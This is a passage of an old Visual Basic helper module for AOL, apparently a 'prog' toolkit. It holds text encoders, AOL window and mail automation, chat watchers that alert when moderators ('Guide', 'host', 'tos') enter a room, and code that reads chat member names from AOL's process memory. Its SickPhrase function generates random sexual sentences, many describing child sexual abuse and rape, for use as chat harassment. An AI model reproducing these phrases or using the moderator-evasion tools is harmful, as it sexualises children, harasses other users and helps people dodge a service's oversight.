    If letter$ = "x" Then leet$ = "¹"
    If letter$ = "y" Then leet$ = "©"
    If letter$ = "z" Then leet$ = "#"
    ' upercase letters
    If letter$ = "A" Then leet$ = "Ï"
    If letter$ = "B" Then leet$ = "Î"
    If letter$ = "C" Then leet$ = "Í"
    If letter$ = "D" Then leet$ = "ß"
    If letter$ = "E" Then leet$ = "Ç"
    If letter$ = "F" Then leet$ = "Å"
    If letter$ = "G" Then leet$ = "Ä"
    If letter$ = "H" Then leet$ = "Ã"
    If letter$ = "I" Then leet$ = "Ð"
    If letter$ = "J" Then leet$ = "Ë"
    If letter$ = "K" Then leet$ = "S"
    If letter$ = "L" Then leet$ = "&"
    If letter$ = "M" Then leet$ = "Y"
    If letter$ = "N" Then leet$ = "W"
    If letter$ = "O" Then leet$ = ">"
    If letter$ = "P" Then leet$ = "<"
    If letter$ = "Q" Then leet$ = "Š"
    If letter$ = "R" Then leet$ = "Û"
    If letter$ = "S" Then leet$ = "+"
    If letter$ = "T" Then leet$ = "="
    If letter$ = "U" Then leet$ = "@"
    If letter$ = "V" Then leet$ = "Ñ"
    If letter$ = "W" Then leet$ = "%"
    If letter$ = "X" Then leet$ = "*"
    If letter$ = "Y" Then leet$ = "Õ"
    If letter$ = "Z" Then leet$ = "~"
    If Len(leet$) = 0 Then leet$ = letter$
    Made$ = Made$ & leet$
Next Q
End Sub
Sub Decrypter(word$)
Made$ = ""
For Q = 1 To Len(word$)
    letter$ = ""
    letter$ = Mid$(word$, Q, 1)
    leet$ = ""
    X = Int(Rnd * 3 + 1)
    If letter$ = "¿" Then leet$ = " "
    If letter$ = "†" Then leet$ = "a"
    If letter$ = "õ" Then leet$ = "b"
    If letter$ = "ð" Then leet$ = "c"
    If letter$ = "ô" Then leet$ = "d"
    If letter$ = "î" Then leet$ = "e"
    If letter$ = "ï" Then leet$ = "f"
    If letter$ = "ì" Then leet$ = "g"
    If letter$ = "é" Then leet$ = "h"
    If letter$ = "ê" Then leet$ = "i"
    If letter$ = "ë" Then leet$ = "j"
    If letter$ = "ä" Then leet$ = "k"
    If letter$ = "å" Then leet$ = "l"
    If letter$ = "â" Then leet$ = "m"
    If letter$ = "ù" Then leet$ = "n"
    If letter$ = "û" Then leet$ = "o"
    If letter$ = "ü" Then leet$ = "p"
    If letter$ = "ç" Then leet$ = "q"
    If letter$ = "ñ" Then leet$ = "r"
    If letter$ = "š" Then leet$ = "s"
    If letter$ = "v" Then leet$ = "t"
    If letter$ = "ÿ" Then leet$ = "u"
    If letter$ = "Ø" Then leet$ = "v"
    If letter$ = "£" Then leet$ = "w"
    If letter$ = "¹" Then leet$ = "x"
    If letter$ = "©" Then leet$ = "y"
    If letter$ = "#" Then leet$ = "z"
    ' upercase letters
    If letter$ = "Ï" Then leet$ = "A"
    If letter$ = "Î" Then leet$ = "B"
    If letter$ = "Í" Then leet$ = "C"
    If letter$ = "ß" Then leet$ = "D"
    If letter$ = "Ç" Then leet$ = "E"
    If letter$ = "Å" Then leet$ = "F"
    If letter$ = "Ä" Then leet$ = "G"
    If letter$ = "Ã" Then leet$ = "H"
    If letter$ = "Ð" Then leet$ = "I"
    If letter$ = "Ë" Then leet$ = "J"
    If letter$ = "S" Then leet$ = "K"
    If letter$ = "&" Then leet$ = "L"
    If letter$ = "Y" Then leet$ = "M"
    If letter$ = "W" Then leet$ = "N"
    If letter$ = ">" Then leet$ = "O"
    If letter$ = "<" Then leet$ = "P"
    If letter$ = "Š" Then leet$ = "Q"
    If letter$ = "Û" Then leet$ = "R"
    If letter$ = "+" Then leet$ = "S"
    If letter$ = "=" Then leet$ = "T"
    If letter$ = "@" Then leet$ = "U"
    If letter$ = "Ñ" Then leet$ = "V"
    If letter$ = "%" Then leet$ = "W"
    If letter$ = "*" Then leet$ = "X"
    If letter$ = "Õ" Then leet$ = "Y"
    If letter$ = "~" Then leet$ = "Z"
    If Len(leet$) = 0 Then leet$ = letter$
    Made$ = Made$ & leet$
Next Q
End Sub
Function Elite(word$)
Made$ = ""
For Q = 1 To Len(word$)
    letter$ = ""
    letter$ = Mid$(word$, Q, 1)
    leet$ = ""
    X = Int(Rnd * 3 + 1)
    If letter$ = "a" Then
    If X = 1 Then leet$ = "â"
    If X = 2 Then leet$ = "å"
    If X = 3 Then leet$ = "ä"
    End If
    If letter$ = "b" Then leet$ = "b"
    If letter$ = "c" Then leet$ = "ç"
    If letter$ = "d" Then leet$ = "d"
    If letter$ = "e" Then
    If X = 1 Then leet$ = "ë"
    If X = 2 Then leet$ = "ê"
    If X = 3 Then leet$ = "é"
    End If
    If letter$ = "i" Then
    If X = 1 Then leet$ = "ì"
    If X = 2 Then leet$ = "ï"
    If X = 3 Then leet$ = "î"
    End If
    If letter$ = "j" Then leet$ = ",j"
    If letter$ = "n" Then leet$ = "ñ"
    If letter$ = "o" Then
    If X = 1 Then leet$ = "ô"
    If X = 2 Then leet$ = "ð"
    If X = 3 Then leet$ = "õ"
    End If
    If letter$ = "s" Then leet$ = "š"
    If letter$ = "t" Then leet$ = "†"
    If letter$ = "u" Then
    If X = 1 Then leet$ = "ù"
    If X = 2 Then leet$ = "û"
    If X = 3 Then leet$ = "ü"
    End If
    If letter$ = "w" Then leet$ = "vv"
    If letter$ = "y" Then leet$ = "ÿ"
    If letter$ = "0" Then leet$ = "Ø"
    If letter$ = "A" Then
    If X = 1 Then leet$ = "Å"
    If X = 2 Then leet$ = "Ä"
    If X = 3 Then leet$ = "Ã"
    End If
    If letter$ = "B" Then leet$ = "ß"
    If letter$ = "C" Then leet$ = "Ç"
    If letter$ = "D" Then leet$ = "Ð"
    If letter$ = "E" Then leet$ = "Ë"
    If letter$ = "I" Then
    If X = 1 Then leet$ = "Ï"
    If X = 2 Then leet$ = "Î"
    If X = 3 Then leet$ = "Í"
    End If
    If letter$ = "N" Then leet$ = "Ñ"
    If letter$ = "O" Then leet$ = "Õ"
    If letter$ = "S" Then leet$ = "Š"
    If letter$ = "U" Then leet$ = "Û"
    If letter$ = "W" Then leet$ = "VV"
    If letter$ = "Y" Then leet$ = "Ý"
    If letter$ = "`" Then leet$ = "´"
    If letter$ = "!" Then leet$ = "¡"
    If letter$ = "?" Then leet$ = "¿"
    If Len(leet$) = 0 Then leet$ = letter$
    Made$ = Made$ & leet$
Next Q
Elite = Made$
End Function


Function AOLWin()
AOL% = FindWindow("AOL Frame25", vbNullString)
AOLWin = AOL%
End Function
Sub Formmove(frm As Form)
DoEvents
ReleaseCapture
ReturnVal% = SendMessage(frm.hwnd, &HA1, 2, 0)
End Sub
Function AOLVersion()
hMenu% = GetMenu(AOLWin())
SubMenu% = GetSubMenu(hMenu%, 0)
subitem% = GetMenuItemID(SubMenu%, 8)
MenuString$ = String$(100, " ")
FindString% = GetMenuString(SubMenu%, subitem%, MenuString$, 100, 1)
If UCase(MenuString$) Like UCase("P&ersonal Filing Cabinet") & "*" Then
AOLVersion = "AOL version 3.0"
Else
AOLVersion = "AOL version 4.0"
End If
End Function
Sub GuideWatch()
Dim index%
Do
    Y = DoEvents()
For index% = 0 To 25
namez$ = String$(256, " ")
If Len(Trim$(namez$)) <= 1 Then GoTo end_ad
namez$ = Left$(Trim$(namez$), Len(Trim(namez$)) - 1)
X = InStr(LCase$(namez$), LCase$("guide"))
If X <> 0 Then
Call AoL4_Keyword("PC")
MsgBox "A Guide has entered the room."
End If
Next index%
end_ad:
Loop
End Sub
Sub CatWatch()
Dim index%
Do
    Y = DoEvents()
For index% = 0 To 25
namez$ = String$(256, " ")
If Len(Trim$(namez$)) <= 1 Then GoTo end_ad
namez$ = Left$(Trim$(namez$), Len(Trim(namez$)) - 1)
X = InStr(LCase$(namez$), LCase$("cat"))
If X <> 0 Then
Call AoL4_Keyword("PC")
MsgBox "Catwatch01 has entered the room."
End If
Next index%
end_ad:
Loop
End Sub
Sub TosWatch()
Dim index%
Do
    Y = DoEvents()
For index% = 0 To 25
namez$ = String$(256, " ")
If Len(Trim$(namez$)) <= 1 Then GoTo end_ad
namez$ = Left$(Trim$(namez$), Len(Trim(namez$)) - 1)
X = InStr(LCase$(namez$), LCase$("tos"))
If X <> 0 Then
Call AoL4_Keyword("PC")
MsgBox "The tos crew has entered the room."
End If
Next index%
end_ad:
Loop
End Sub
Sub HostWatch()
Dim index%
Do
    Y = DoEvents()
For index% = 0 To 25
namez$ = String$(256, " ")
If Len(Trim$(namez$)) <= 1 Then GoTo end_ad
namez$ = Left$(Trim$(namez$), Len(Trim(namez$)) - 1)
X = InStr(LCase$(namez$), LCase$("host"))
If X <> 0 Then
Call AoL4_Keyword("PC")
MsgBox "A host has entered the room."
End If
Next index%
end_ad:
Loop
End Sub
Sub KillWin(Windo)
X = SendMessageByNum(Windo, WM_CLOSE, 0, 0)
End Sub
Sub unupchat()
aom% = FindWindow("_AOL_Modal", vbNullString)
DoEvents
X = ShowWindow(aom%, SW_RESTORE)
X = ShowWindow(aom%, SW_SHOW)
X = SetFocusAPI(aom%)
End Sub
Function upchat()
AOL% = FindWindow("AOL Frame25", vbNullString)
AOModal% = FindChildByClass(AOL%, "_AOL_Modal")
AOGauge% = FindChildByClass(AOModal%, "_AOL_Gauge")
If AOGauge% <> 0 Then Upp% = AOModal%
aom% = FindWindow("_AOL_Modal", vbNullString)
DoEvents
X = ShowWindow(aom%, SW_MINIMIZE)
X = SetFocusAPI(AOL%)
Call EnableWindow(AOL%, 1)
Call EnableWindow(Upp%, 0)
End Function
Function SickPhrase() As String
Randomize Timer
Select Case Int(Rnd * 15)
    Case 0: Phrase$ = "I LIKE TO "
    Case 1: Phrase$ = "I LOVE TO "
    Case 2: Phrase$ = "IT MAKES ME HORNY WHEN I "
    Case 3: Phrase$ = "MY ASSHOLE GETS WET WHEN I "
    Case 4: Phrase$ = "IT GIVES ME ANAL PLEASURE TO "
    Case 5: Phrase$ = "IT MAKES ME CUM WHEN I "
    Case 6: Phrase$ = "I MOAN WHEN I "
    Case 7: Phrase$ = "I CUM INTO MY ASSHOLE WHEN I "
    Case 8: Phrase$ = "I LOVE THE FEELING I GET WHEN I "
    Case 9: Phrase$ = "MY ANAL ROLLS JIGGLE WHEN I "
    Case 10: Phrase$ = "I INSERT MY PINKY INTO THE TIP OF MY PENIS SO I CAN "
    Case 11: Phrase$ = "I POSE AS A PRIEST JUST SO I CAN "
    Case 12: Phrase$ = "IT MAKES ME CUM IN MY PANTIES WHEN I "
    Case 13: Phrase$ = "I STICK MY THUMB UP MY ASS WHEN I "
    Case 14: Phrase$ = "ALL PAIN DISSAPPEARS WHEN I "
End Select
Select Case Int(Rnd * 19)
    Case 0: Phrase$ = Phrase$ + "FONDLE LITTLE BOYS"
    Case 1: Phrase$ = Phrase$ + "TOUCH LITTLE GIRLS"
    Case 2: Phrase$ = Phrase$ + "FINGER FUCK MY ASSHOLE"
    Case 3: Phrase$ = Phrase$ + "ANALY RAPE CHICKENS"
    Case 4: Phrase$ = Phrase$ + "ASS FUCK NUNS"
    Case 5: Phrase$ = Phrase$ + "MOLEST PRE SCHOOLERS"
    Case 6: Phrase$ = Phrase$ + "STRETCH THE ASSHOLES OF KINDERGARTENERS"
    Case 7: Phrase$ = Phrase$ + "HAVE A 5 YEAR OLD GIRL SUCK MY PENIS"
    Case 8: Phrase$ = Phrase$ + "LOOK AT OTHER MEN"
    Case 9: Phrase$ = Phrase$ + "TOUCH OTHER MENS PENIS'S AND THEN STROKE THEIR SHAFTS"
    Case 10: Phrase$ = Phrase$ + "MAKE WILD AND PASSIONATE LOVE TO OTHER MEN"
    Case 11: Phrase$ = Phrase$ + "FINGER MY MOTHERS CUNT"
    Case 12: Phrase$ = Phrase$ + "STRANGLE LITTLE BOYS THEN RAPE THEIR DEAD BODIES"
    Case 13: Phrase$ = Phrase$ + "GET INTO THE PANTS OF A 7 YEAR OLD GIRL"
    Case 14: Phrase$ = Phrase$ + "MOLEST STATUES OF GREAT AMERICAN HEROES"
    Case 15: Phrase$ = Phrase$ + "BUTT FUCK BILL CLINTON"
    Case 16: Phrase$ = Phrase$ + "SHOVE A BROOM STICK UP MY PET DOGS ASSHOLE"
    Case 17: Phrase$ = Phrase$ + "GO TO A PLAYGROUND AND MOLEST THE CHILDREN"
    Case 18: Phrase$ = Phrase$ + "BREAK IN A 5 YEAR OLDS PUSSY"
End Select
SickPhrase = Phrase$
End Function
Function ScrambleIt(Txt As String) As String
Dim word$, Buff$
Dim Random%, I%, A%
Separate:
Do: DoEvents
    A% = InStr(Txt$, " ")
    If A% = 0 Then
        Buff$ = Txt$
        Txt$ = ""
        Exit Do
    End If
    If A% = 1 Then
        ScrambleIt$ = ScrambleIt$ & " "
        Txt$ = Right$(Txt$, Len(Txt$) - 1)
    End If
    If A% > 1 Then
        Buff$ = Left$(Txt$, A% - 1)
        Txt$ = Right$(Txt$, Len(Txt$) - A% + 1)
        Exit Do
    End If
Loop Until A% = 0
word$ = ""
For I% = 1 To Len(Buff$) - 1
    Random% = Int(Len(Buff$) * Rnd + 1)
    word$ = word$ & Mid$(Buff$, Random%, 1)
    Buff$ = Left$(Buff$, Random% - 1) & Right$(Buff$, Len(Buff$) - Random%)
Next I%
word$ = word$ & Buff$
ScrambleIt$ = ScrambleIt$ & word$
If Txt$ <> "" Then GoTo Separate
End Function
Function MMCreateMailList(Lst As ListBox) As String
For I = 0 To Lst.ListCount - 1
    Final$ = Final$ & "," & Lst.List(I)
    Next I
MMCreateMailList = "( " & Final$ & " )"
End Function
Function SearchMenu(mnuWnd As Integer, MenuCaption As String) As Integer
Dim menu%
mnuCount = GetMenuItemCount(mnuWnd%)
For num = 0 To mnuCount - 1
    Text$ = Space(100)
    X = GetMenuString(mnuWnd%, num, Text$, 100, WM_USER)
    Text$ = FixAPIString(Text$)
    SubMenu% = GetSubMenu(mnuWnd%, num)
    If InStr(1, Text$, MenuCaption$, 1) Then
        SubMenu% = GetSubMenu(mnuWnd%, num)
        menu% = SubMenu%
        Menuid% = GetMenuItemID(mnuWnd%, num)
    ElseIf (SubMenu% <> 0) Then
        Menuid% = SearchMenu(SubMenu%, MenuCaption$)
    End If
    If (Menuid% <> 0) Then
        Exit For
    End If
Next num
SearchMenu = Menuid%
End Function
Sub ClipBoardCopyTo(Text As String)
Clipboard.SetText (Text)
End Sub
Function ClipBoardGetFrom()
ClipBoardGetFrom = Clipboard.GetText
End Function
Function ClipBoardClear()
Clipboard.Clear
End Function
Sub AddList(List As ListBox, Txt$)
On Error Resume Next
DoEvents
For X = 0 To List.ListCount - 1
    If UCase$(List.List(X)) = UCase$(Txt$) Then Exit Sub
Next
If Len(Txt$) <> 0 Then List.AddItem Txt$
End Sub
Sub FormMinimize(frm As Form)
frm.WindowState = 1
End Sub
Sub NotOnTop(the As Form)
SetWinOnTop = SetWindowPos(the.hwnd, HWND_NOTOPMOST, 0, 0, 0, 0, FLAGS)
End Sub
Sub ListCopy(source, Destination)
'Copies 1 list to another
counts = SendMessage(source, LB_GETCOUNT, 0, 0)
For Adding = 0 To counts - 1
buffer$ = String$(250, 0)
getstrings% = SendMessageByString(source, LB_GETTEXT, Adding, buffer$)
addstrings% = SendMessageByString(Destination, LB_ADDSTRING, 0, buffer$)
Next Adding
End Sub
Sub ListDeleteItem(Lst As ListBox)
del = Lst.ListIndex
Lst.RemoveItem (del)
End Sub
Function ListCount(Lst As ListBox)
X = Lst.ListCount
ListCount = X
End Function
Function ComboCount(cmb As ComboBox)
X = cmb.ListCount
ComboCount = X
End Function
Sub KillListDupes(Lst As Control)
On Error Resume Next
For I = 0 To Lst.ListCount - 1
For e = 0 To Lst.ListCount - 1
If LCase(Lst.List(I)) Like LCase(Lst.List(e)) And I <> e Then
Lst.RemoveItem (e)
End If
Next e
Next I
End Sub
Sub KillComboDupes(cmb As Control)
For I = 0 To cmb.ListCount - 1
For e = 0 To cmb.ListCount - 1
If LCase(cmb.List(I)) Like LCase(cmb.List(e)) And I <> e Then
cmb.RemoveItem (e)
End If
Next e
Next I
End Sub
Sub CloseWin(wind)
CloseIt = SendMessage(wind, WM_CLOSE, 0, 0)
End Sub
Function AOL40_GetText(child)
GetTrim = SendMessageByNum(child, 14, 0&, 0&)
TrimSpace$ = Space$(GetTrim)
getstring = SendMessageByString(child, 13, GetTrim + 1, TrimSpace$)
AOL40_GetText = TrimSpace$
End Function
Public Function RandomSlot()
Randomize
A = Int(Rnd * 7) + 1
If A = 1 Then RandomSlot = "<font face=""webdings"">r"
If A = 2 Then RandomSlot = "<font face=""webdings"">y"
If A = 3 Then RandomSlot = "<font face=""webdings"">l"
If A = 4 Then RandomSlot = "<font face=""webdings"">g"
If A = 5 Then RandomSlot = "<font face=""webdings"">d"
If A = 6 Then RandomSlot = "<font face=""webdings"">c"
If A = 7 Then RandomSlot = "<font face=""webdings"">n"
End Function
Public Function RandomFace()
Randomize
A = Int(Rnd * 13) + 1
If A = 1 Then RandomFace = "Ace"
If A = 2 Then RandomFace = "King"
If A = 3 Then RandomFace = "Queen"
If A = 4 Then RandomFace = "Jack"
If A = 5 Then RandomFace = "Ten"
If A = 6 Then RandomFace = "Nine"
If A = 7 Then RandomFace = "Eight"
If A = 8 Then RandomFace = "Seven"
If A = 9 Then RandomFace = "Six"
If A = 10 Then RandomFace = "Five"
If A = 11 Then RandomFace = "Four"
If A = 12 Then RandomFace = "Three"
If A = 13 Then RandomFace = "Two"
End Function
Public Function RandomSuit()
Randomize
A = Int(Rnd * 4) + 1
If A = 1 Then RandomSuit = " of Hearts"
If A = 2 Then RandomSuit = " of Spades"
If A = 3 Then RandomSuit = " of Clubs"
If A = 4 Then RandomSuit = " of Diamonds"
End Function
Sub KillGlyph()
AOL% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(AOL%, "AOL Toolbar")
aotool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")
glyph% = FindChildByClass(aotool2%, "_AOL_Glyph")
Call SendMessage(glyph%, WM_CLOSE, 0, 0)
End Sub
Function TrimTime()
bb$ = Left$(Time$, 5)
HourH$ = Left$(bb$, 2)
HourA = val(HourH$)
If HourA >= 12 Then Ap$ = "PM"
If HourA = 24 Or HourA < 12 Then Ap$ = "AM"
If HourA > 12 Then
    HourA = HourA - 12
End If
If HourA = 0 Then HourA = 12
HourH$ = str$(HourA)
TrimTime = HourH$ & Right$(bb$, 3) & " " & Ap$
End Function
Function TrimNull(ByVal indd As String)
For X = 1 To Len(indd)
    If Mid$(indd, X, 1) <> Chr$(0) Then
    Total$ = Total$ + Mid$(indd, X, 1)
    Else
    GoTo NullDetect
    End If
Next
NullDetect:
TrimNull = Total$
End Function
Function PlayMpeg(file As String)
Dim X
X = mciExecute("Play " + file + "")
End Function
Function StopMpeg(file As String)
Dim X
X = mciExecute("Stop " + file + "")
End Function
Sub ScrollingCredits(lbl As Label)
lbl.Height = val(lbl.Height) + 10
End Sub
Sub ScrollFormUp(frm As Form)
frm.Height = val(frm.Height) - 20
End Sub
Sub ScrollFormDown(frm As Form)
frm.Height = val(frm.Height) + 20
End Sub
Function ReverseText(Text)
For words = Len(Text) To 1 Step -1
ReverseText = ReverseText & Mid(Text, words, 1)
Next words
End Function
Sub RestartComputer()
ForcedShutdown = ExitWindowsEx(EWX_REBOOT, 0&)
End Sub
Sub PreVent()
If App.PrevInstance Then End
End Sub
Sub PlayWav(file)
Dim X%
SoundName$ = file
   wFlags% = SND_ASYNC Or SND_NODEFAULT
   X% = sndPlaySound(SoundName$, wFlags%)
End Sub
Sub KillModal()
modal% = FindWindow("_AOL_Modal", vbNullString)
Call SendMessage(modal%, WM_CLOSE, 0, 0)
End Sub
Public Sub AOLClickToolBar(Number As Integer)
AOL% = FindWindow("AOL Frame25", vbNullString)
tb% = FindChildByClass(AOL%, "AOL Toolbar")
tc% = FindChildByClass(tb%, "_AOL_Toolbar")
td% = FindChildByClass(tc%, "_AOL_Icon")
If Number = 1 Then
    AOLClickIcon (td%)
    Exit Sub
End If
For T = 0 To Number - 2
td% = GetWindow(td%, 2)
Next T
Call AOLClickIcon(td%)
End Sub
Function WaitForWin(Caption As String) As Integer
Do
DoEvents
win% = FindChildByTitle(AOLMDI, Caption)
Loop Until win% <> 0
WaitForWin = win%
End Function
Sub waitforok()
Do
DoEvents
OKW = FindWindow("#32770", "America Online")
If proG_STAT$ = "OFF" Then
Exit Sub
Exit Do
End If
Loop Until OKW <> 0
       OKB = FindChildByTitle(OKW, "OK")
    okd = SendMessageByNum(OKB, WM_LBUTTONDOWN, 0, 0&)
    oku = SendMessageByNum(OKB, WM_LBUTTONUP, 0, 0&)
End Sub
Function WavY(thetext As String)
G$ = thetext
A = Len(G$)
For w = 1 To A Step 4
    R$ = Mid$(G$, w, 1)
    u$ = Mid$(G$, w + 1, 1)
    s$ = Mid$(G$, w + 2, 1)
    T$ = Mid$(G$, w + 3, 1)
    p$ = p$ & "<sup>" & R$ & "</sup>" & u$ & "<sub>" & s$ & "</sub>" & T$
Next w
WavY = p$
End Function
Function CenterForm(F As Form)
F.Top = (Screen.Height * 0.85) / 2 - F.Height / 2
F.Left = Screen.Width / 2 - F.Width / 2
End Function
Sub LoadAol40()
'This will load AOL4.0
X% = Shell("C:\America Online 4.0\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
X% = Shell("C:\America Online 4.0A\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
X% = Shell("C:\America Online 4.0B", 1): NoFreeze% = DoEvents(): Exit Sub
End Sub
Function AOL40_Mail_Find()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
Firs% = GetWindow(MDI%, 5)
listers% = FindChildByClass(Firs%, "RICHCHTL")
listere% = FindChildByClass(Firs%, "_AOL_Static")
listerb% = FindChildByClass(Firs%, "_AOL_Icon")
If listers% And listere% And listerb% Then GoTo bone
Firs% = GetWindow(MDI%, GW_CHILD)
While Firs%
Firs% = GetWindow(Firs%, 2)
listers% = FindChildByClass(Firs%, "RICHCHTL")
listere% = FindChildByClass(Firs%, "_AOL_Static")
listerb% = FindChildByClass(Firs%, "_AOL_Icon")
If listers% And listere% And listerb% Then GoTo bone
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
Firs% = GetWindow(MDI%, 5)
listers% = FindChildByClass(Firs%, "_AOL_Icon")
listere% = FindChildByClass(Firs%, "_AOL_Icon")
listerb% = FindChildByClass(Firs%, "_AOL_Icon")
If listers% And listere% And listerb% Then GoTo bone
Wend
bone:
Room% = Firs%
AOL40_Mail_Find = Room%
End Function
Sub AOL40_Mail_Open()
AOL% = FindWindow("AOL Frame25", vbNullString)
toolbar% = FindChildByClass(AOL%, "AOL Toolbar")
ToolBarChild% = FindChildByClass(toolbar%, "_AOL_Toolbar")
TooLBaRB% = FindChildByClass(ToolBarChild%, "_AOL_Icon")
ClickIcon TooLBaRB%
End Sub
Sub AOL40_Mail_ReadMail()
AOL% = FindWindow("AOL Frame25", vbNullString)
toolbar% = FindChildByClass(AOL%, "AOL Toolbar")
ToolBarChild% = FindChildByClass(toolbar%, "_AOL_Toolbar")
TooLBaRB% = FindChildByClass(ToolBarChild%, "_AOL_Icon")
ClickIcon TooLBaRB%
MDI% = FindChildByClass(AOL%, "MDIClient")
Do
fsd% = FindChildByClass(MDI%, GetUser() & "'s Online Mailbox")
Loop Until fds% <> 0
fsd% = FindChildByClass(MDI%, GetUser() & "'s Online Mailbox")
mail% = FindChildByClass(fds%, "_AOL_Tree")
timeout 0.5
ClickIcon (mail%)
End Sub
Sub AOL40_Mail_Send(SN, subject, message)
Dim icon%
tool% = FindChildByClass(AOLWin(), "AOL Toolbar")
toolbar% = FindChildByClass(tool%, "_AOL_Toolbar")
icon% = FindChildByClass(toolbar%, "_AOL_Icon")
icon% = GetWindow(icon%, GW_HWNDNEXT)
Call ClickIcon(icon%)
Do: DoEvents
mail% = FindChildByTitle(AOLMDI(), "Write Mail")
edit% = FindChildByClass(mail%, "_AOL_Edit")
Rich% = FindChildByClass(mail%, "RICHCNTL")
icon% = FindChildByClass(mail%, "_AOL_ICON")
Loop Until mail% <> 0 And edit% <> 0 And Rich% <> 0 And icon% <> 0
Call SendMessageByString(edit%, WM_SETTEXT, 0, SN)
edit% = GetWindow(edit%, GW_HWNDNEXT)
edit% = GetWindow(edit%, GW_HWNDNEXT)
edit% = GetWindow(edit%, GW_HWNDNEXT)
edit% = GetWindow(edit%, GW_HWNDNEXT)
Call SendMessageByString(edit%, WM_SETTEXT, 0, subject)
Call SendMessageByString(Rich%, WM_SETTEXT, 0, message)
For GetIcon = 1 To 18
icon% = GetWindow(icon%, GW_HWNDNEXT)
Next GetIcon
Call ClickIcon(icon%)
End Sub
Sub AoL40_Mail_WriteNew()
AOL% = FindWindow("AOL Frame25", vbNullString)
toolbar% = FindChildByClass(AOL%, "AOL Toolbar")
ToolBarChild% = FindChildByClass(toolbar%, "_AOL_Toolbar")
TooLBaRB% = FindChildByClass(ToolBarChild%, "_AOL_Icon")
TooLBaRB% = GetWindow(TooLBaRB%, 2)
ClickIcon TooLBaRB%
End Sub
Sub RunMenu(menu1 As Integer, menu2 As Integer)
Dim AOLWorks As Long
Static Working As Integer
AOLMenus% = GetMenu(FindWindow("AOL Frame25", vbNullString))
AOLSubMenu% = GetSubMenu(AOLMenus%, menu1)
AOLItemID = GetMenuItemID(AOLSubMenu%, menu2)
AOLWorks = CLng(0) * &H10000 Or Working
ClickAOLMenu = SendMessageByNum(FindWindow("AOL Frame25", vbNullString), 273, AOLItemID, 0&)
End Sub
Sub RunMenuByString(Application, StringSearch)
ToSearch% = GetMenu(Application)
MenuCount% = GetMenuItemCount(ToSearch%)
For FindString = 0 To MenuCount% - 1
ToSearchSub% = GetSubMenu(ToSearch%, FindString)
menuItemCount% = GetMenuItemCount(ToSearchSub%)
For getstring = 0 To menuItemCount% - 1
SubCount% = GetMenuItemID(ToSearchSub%, getstring)
MenuString$ = String$(100, " ")
GetStringMenu% = GetMenuString(ToSearchSub%, SubCount%, MenuString$, 100, 1)
If InStr(UCase(MenuString$), UCase(StringSearch)) Then
MenuItem% = SubCount%
GoTo MatchString
End If
Next getstring
Next FindString
MatchString:
RunTheMenu% = SendMessage(Application, WM_COMMAND, MenuItem%, 0)
End Sub
Sub HideAOL()
AOL% = FindWindow("AOL Frame25", vbNullString)
Call ShowWindow(AOL%, 0)
End Sub

Sub showaol()
AOL% = FindWindow("AOL Frame25", vbNullString)
Call ShowWindow(AOL%, 5)
End Sub
Sub GetMemberProfile(SN)
PoPup 9, "g"
Do: DoEvents
prof% = FindChildByTitle(AOLMDI(), "Get a Member's Profile")
Loop Until prof% <> 0
Pause 1
edit% = FindChildByClass(prof%, "_AOL_Edit")
Call SendMessageByString(edit%, WM_SETTEXT, 0, SN)
Enter (edit%)
End Sub
Sub CloseChat()
Room% = AOL40_FindChatRoom
Call SendMessage(Room%, WM_CLOSE, 0, 0)
End Sub
Function RandomFade(Text1 As String)
Dim l003A As Variant
Randomize Timer
l003A = Int(Rnd * 8)
Select Case l003A
Case 1: BlackBlue (Text1)
    Case 2: PurpleRed (Text1)
 Case 3: BlueBlack (Text1)
    Case 4: RedBlue (Text1)
   Case 5: PurpleGreen (Text1)
   Case 6: PurpleYellow (Text1)
   Case 7: PurpleBlue (Text1)
    Case 8: BlueYellow (Text1)
   Case 9:  BlackGreen (Text1)
    Case 10: GreenBlue (Text1)
   Case 11: RedYellow (Text1)
   Case 12: BlueGreen (Text1)
    Case 13: BlueRed (Text1)
    Case 14: BlackYellow (Text1)
    Case 15: YellowBlack (Text1)
   Case 16: RedBlack (Text1)
    Case 17: BluePurple (Text1)
    Case 18: GreenYellow (Text1)
    Case 19: GreenPurple (Text1)
    Case 20: RedYellow (Text1)
Case Else: BlackRed (Text1)
End Select
End Function
Function fulldate() As String
fulldate$ = Format$(Now, "dddd, mmmm dd, yyyy")
End Function
Function fulldate2() As String
fulldate2$ = Format$(Now, "ddd, mmm dd, yy")
End Function
Function TrimmedUserSN()
On Error Resume Next
AOL% = FindWindow("AOL Frame25", "America  Online")
MDI% = FindChildByClass(AOL%, "MDIClient")
welcome% = FindChildByTitle(MDI%, "Welcome, ")
WelcomeLength% = GetWindowTextLength(welcome%)
WelcomeTitle$ = String$(200, 0)
A% = GetWindowText(welcome%, WelcomeTitle$, (WelcomeLength% + 1))
User = Mid$(WelcomeTitle$, 10, (InStr(WelcomeTitle$, "!") - 10))
TrimmedUserSN = TrimSpacess(User)
End Function
Function AOLSupRoom()
AOL40_IsOnline
If AOL40_IsOnline = 0 Then GoTo last
AOL40_FindChatRoom
If AOL40_FindChatRoom = 0 Then GoTo last
On Error Resume Next
Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
    Room = AOL40_FindChatRoom()
AOLHandle = FindChildByClass(Room, "_AOL_Listbox")
AOLThread = GetWindowThreadProcessId(AOLHandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)
If AOLProcessThread Then
For index = 0 To SendMessage(AOLHandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(AOLHandle, LB_GETITEMDATA, ByVal CLng(index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6
Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)
Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
Person$ = LCase(Person$)
